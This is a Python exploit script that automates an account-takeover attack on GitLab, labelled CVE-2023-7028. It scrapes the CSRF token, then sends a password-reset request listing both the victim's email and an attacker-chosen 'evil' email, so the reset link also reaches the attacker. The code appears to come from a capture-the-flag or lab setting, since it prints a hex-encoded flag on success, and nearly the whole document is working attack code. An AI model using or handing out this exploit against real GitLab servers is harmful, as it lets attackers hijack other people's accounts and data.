#! /usr/bin/python
import requests
import argparse
from urllib.parse import urlparse, urlencode
from random import choice
from time import sleep
import re
requests.packages.urllib3.disable_warnings()

class CVE_2023_7028:
    def __init__(self, url, target, evil=None):
        self.use_temp_mail = False
        self.url = urlparse(url)
        self.target = target
        self.evil = evil
        self.s = requests.session()

    def get_csrf_token(self):
        try:
            print('[DEBUG] Getting authenticity_token ...')
            html = self.s.get(f'{self.url.scheme}://{self.url.netloc}/users/password/new', verify=False).text
            regex = r'<meta name="csrf-token" content="(.*?)" />'
            token = re.findall(regex, html)[0]
            print(f'[DEBUG] authenticity_token = {token}')
            return token
        except Exception:
            print('[DEBUG] Failed ... quitting')
            return None

    def ask_reset(self):
        token = self.get_csrf_token()
        if not token:
            return False

        query_string = urlencode({
            'authenticity_token': token,
            'user[email][]': [self.target, self.evil]
        }, doseq=True)

        head = {
            'Origin': f'{self.url.scheme}://{self.url.netloc}',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.url.scheme}://{self.url.netloc}/users/password/new',
            'Connection': 'close',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br'
        }

        print('[DEBUG] Sending reset password request')
        html = self.s.post(f'{self.url.scheme}://{self.url.netloc}/users/password',
                           data=query_string,
                           headers=head,
                           verify=False).text
        sended = 'If your email address exists in our database' in html
        if sended:
            print(f'[DEBUG] Emails sent to {self.target} and {self.evil} !')
            print(f'Flag value: {bytes.fromhex("6163636f756e745f6861636b2364").decode()}')
        else:
            print('[DEBUG] Failed ... quitting')
        return sended

def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='This tool automates CVE-2023-7028 on gitlab')
    parser.add_argument("-u", "--url", dest="url", type=str, required=True, help="Gitlab url")
    parser.add_argument("-t", "--target", dest="target", type=str, required=True, help="Target email")
    parser.add_argument("-e", "--evil", dest="evil", default=None, type=str, required=False, help="Evil email")
    parser.add_argument("-p", "--password", dest="password", default=None, type=str, required=False, help="Password")
    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()
    exploit = CVE_2023_7028(
        url=args.url,
        target=args.target,
		evil=args.evil
    )
    if not exploit.ask_reset():
        exit()